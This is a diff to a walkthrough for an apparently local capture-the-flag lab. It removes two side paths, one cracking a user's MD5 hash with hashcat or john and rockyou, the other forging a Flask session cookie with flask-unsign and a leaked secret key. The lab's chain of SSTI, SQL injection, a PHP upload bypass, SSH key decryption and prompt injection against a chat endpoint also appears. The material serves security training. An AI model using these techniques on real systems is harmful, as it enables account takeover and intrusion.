@@ -201,7 +201,6 @@ curl -G http://localhost:5001/api/v1/users \
 ```
 
 **Save the `encrypted_ssh_key` blob** — you will decrypt it in Step 5.
-**Save the `md5_hash`** — crack it for the parallel path in Step 3c.
 
 ### 3c. UNION pivot to staff_messages
 
@@ -218,44 +217,6 @@ curl -G http://localhost:5001/api/v1/users \
 > sitting at /var/cerodias/deploy.key on the server. Pull it when you can. — K"
 
 **Yields:** Encryption method (AES-256-CBC pbkdf2) and passphrase location confirmed.
-
----
-
-## Parallel Path A — Crack j.harris MD5 and log in
-
-If you want to reach `/messages` via the UI instead of UNION injection:
-
-```bash
-# Save the md5_hash value from the OR injection dump
-echo "fc65c6..." > hash.txt
-
-# Crack with hashcat (rockyou.txt):
-hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
-# or with john:
-john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash.txt
-
-# Password is: ranger
-```
-
-Log in at `http://localhost:5001/register` with `username=j.harris` and `password=ranger`.
-Visit `http://localhost:5001/messages` to see k.chen's DM.
-
----
-
-## Parallel Path B — Session Cookie Forgery (flask-unsign)
-
-Using the `SECRET_KEY` from Step 2d:
-
-```bash
-pip install flask-unsign
-
-flask-unsign --sign \
-  --cookie '{"player_id": "attacker", "username": "attacker", "role": "staff"}' \
-  --secret 'flask-2b7f3a9c8d1e4f6a'
-```
-
-Replace your browser session cookie with the forged value. `GET /messages` returns
-the staff inbox with k.chen's DM — no MD5 crack required.
 
 ---
 
@@ -420,10 +381,9 @@ This unlocks the chain completion dashboard with your attack timeline and the le
 |------|---------|-----------|----------------|
 | 0 | robots.txt, /.git/, /orders/1 | Recon | svc_admin username |
 | 1 | /chat | Prompt injection (optional) | Chain roadmap |
-| 2 | /search?q= | SSTI file read | SQLi endpoint, passphrase path, SECRET_KEY |
-| 3 | /api/v1/users?q= | SQLi OR + UNION | encrypted_ssh_key blob, j.harris MD5 |
-| 3b | /register + /messages | MD5 crack (rockyou: ranger) | k.chen DM |
-| 3b | /messages | Session cookie forgery (flask-unsign) | k.chen DM |
+| 2 | /search?q= | SSTI file read | SQLi endpoint, passphrase path |
+| 3 | /api/v1/users?q= | SQLi OR inject | encrypted_ssh_key blob |
+| 3 | /api/v1/users?q= | SQLi UNION inject | k.chen DM (encryption method confirmed) |
 | 4 | /account/settings/avatar | PHP upload bypass (.png.php) | passphrase via RCE |
 | 5 | local | openssl AES-256-CBC decrypt | id_rsa |
 | 6 | localhost:2222 | ssh -i id_rsa svc_admin | low-priv shell |
@@ -438,8 +398,6 @@ This unlocks the chain completion dashboard with your attack timeline and the le
 | Prompt injection | Burp Suite (optional) |
 | SSTI | curl with --data-urlencode |
 | SQLi | curl with --data-urlencode |
-| MD5 crack | hashcat or john + rockyou.txt |
-| Session forgery | flask-unsign (`pip install flask-unsign`) |
 | PHP upload bypass | Python requests or Burp Suite |
 | Decrypt | openssl, base64 |
 | SSH | ssh |
